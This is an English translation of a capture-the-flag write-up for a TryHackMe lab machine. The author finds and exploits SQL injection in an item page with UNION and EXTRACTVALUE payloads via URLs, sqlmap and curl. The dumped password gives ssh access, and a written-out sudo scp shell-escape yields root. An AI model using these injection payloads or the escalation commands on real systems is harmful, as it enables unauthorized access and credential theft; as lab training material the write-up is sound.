> *This translation has been made by Claude, check out the original writeup [here](README.md).*

# Jurassic Park

![Screenshot](img/Pasted%20image%2020260427112917.png)

https://tryhackme.com/room/jurassicpark

![Screenshot](img/Pasted%20image%2020260427113004.png)

![Screenshot](img/Pasted%20image%2020260427113026.png)

A CTF rated *Hard.* Fun! I usually stick to the easy-medium territory.
## Recon
Nmap shows:

![Screenshot](img/Pasted%20image%2020260427113324.png)

The site on port 80 looks like this:

![Screenshot](img/Pasted%20image%2020260427113422.png)

There's a web shop:

![Screenshot](img/Pasted%20image%2020260427113953.png)

The URL looks like this: `/item.php?id=3`

Tobzon has worked with SQL a fair bit so he gives me some tips, nice!

I typed in `/item.php?id=3 UNION SELECT` and got the following:

![Screenshot](img/Pasted%20image%2020260427114327.png)

Trying to enumerate how many columns there are:

![Screenshot](img/Pasted%20image%2020260427114423.png)

When I reached `/item.php?id=3 UNION SELECT 1,2,3,4,5` I got the following:

![Screenshot](img/Pasted%20image%2020260427114524.png)

Since I'm on item 3, I swapped the three for `database()` and got the following:

<details>
  <summary><b>Click here to take a peek</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427114607.png)
</details><br>



So, the name of the database.

### Version

Swapping `database()` for `version()` gave me the following:

<details>
  <summary><b>Click here to take a look</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427115646.png)
</details><br>



Found out the column names via `http://10.114.136.120/item.php?id=3%20UNION%20SELECT%201,2,column_name,4,5%20FROM%20information_schema.columns%20WHERE%20column_name=%27users%27`

Column 3 is called `users`

Tried to list all entries in `users` with `http://10.114.136.120/item.php?id=3%20UNION%20SELECT%201,2,column_name,4,5%20FROM%20information_schema.columns%20WHERE%20column_name=%27users%27` but got:

![Screenshot](img/Pasted%20image%2020260427121114.png)

Time to kick off sqlmap
## sqlmap
Ran `sqlmap -r req.txt --level=4 --risk=3 --dbs --batch`, the request looked like this:

![Screenshot](img/Pasted%20image%2020260427121822.png)

sqlmap answered like this:

![Screenshot](img/Pasted%20image%2020260427121844.png)

There I get confirmation that there's a database called `park`. Nothing new admittedly, but still. Now let's see if sqlmap can dig a bit deeper.

Ran `sqlmap -u http://$IP/item.php?id=3 -D park --tables --threads=5` but it failed to find any tables in park:

![Screenshot](img/Pasted%20image%2020260427133235.png)

Tweaking my command a bit so sqlmap focuses on the vulnerability I found earlier. Running with the flag `--technique=E` instead now.

It still fails to list any tables in the database though :(

![Screenshot](img/Pasted%20image%2020260427154255.png)

Can't get it to work, so switching to curl instead.
## curl

First tested that it worked with `curl -v "http://$IP/item.php?id=3"`, then added a `'` at the end and could see a syntax error in the response.

![Screenshot](img/Pasted%20image%2020260427204213.png)

Then worked out the command `curl -s -G "http://$IP/item.php" --data-urlencode "id=3 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=0x7061726b)))"` Well, AI did...

![Screenshot](img/Pasted%20image%2020260427204408.png)

There I see `items` and `users`. Interesting.

Want to dump the columns from `users`

`curl -s -G "http://$IP/item.php" --data-urlencode "id=3 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273)))"`

![Screenshot](img/Pasted%20image%2020260427204557.png)

5 columns if I understand it correctly?

Starting by dumping the data in `username`

Then I got the same response as before, that same image, but with curl this time...

<img height="150px" src="img/Pasted image 20260427121114.png"></img>

It went better with `password`

<details>
  <summary><b>You can take a look here</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427205023.png)
</details><br>



In the question on TryHackMe it says "What's Dennis' password?". And `ih8dinos` fits perfectly as the answer. Worth trying to log in with ssh?
## ssh

Logged in with the credentials `dennis:ih8dinos` and got in!

![Screenshot](img/Pasted%20image%2020260427205338.png)

There I found the first flag.

<details>
  <summary><b>Come and see!</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427205411.png)
</details><br>

Continuing to search the system

![Screenshot](img/Pasted%20image%2020260427210633.png)

Checked the bash history and stumbled upon flag 3.

<details>
  <summary><b>Found here</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427210706.png)
</details><br>

I also know that dennis has sudo permissions to run `scp` (found this out by running `sudo -l`), and the bash history reveals a bit of how he's used that program

![Screenshot](img/Pasted%20image%2020260427210933.png)

Exfiltrated the fifth flag to a bunch of places?

`test.sh` is also a small script that prints out the fifth flag. Would be nice to run the script as root...

![Screenshot](img/Pasted%20image%2020260427211108.png)

`.viminfo` contained this gem

![Screenshot](img/Pasted%20image%2020260427211352.png)

Can I read it? Yep :)

<details>
  <summary><b>Flag party!</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427211436.png)
</details><br>



One flag left, and that's the fifth one, which is in root. I somehow need to manage to make `test.sh` executable with root privileges using scp.

According to [gtfobins.org](https://gtfobins.org/gtfobins/scp/) I can either copy the file from the root directory to a place where I can read it - like a local directory or my own computer. But, I can also spawn a root shell. The latter is much cooler :D

![Screenshot](img/Pasted%20image%2020260427212706.png)

Hm, can't get it to work. I kind of get a root shell but I keep getting kicked out of it.

The following worked though!

```bash
TF=$(mktemp) 
echo 'sh 0<&2 1>&2' > $TF 
chmod +x "$TF" 
sudo scp -S $TF x y:
```

![Screenshot](img/Pasted%20image%2020260427213851.png)

`cat /root/flag5.txt` gave:

<details>
  <summary><b>Last flag!</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427213942.png)
</details><br>

Don't ask me why it was possible to spawn a shell that way. Anyone want to explain?

All flags secured, wiho!
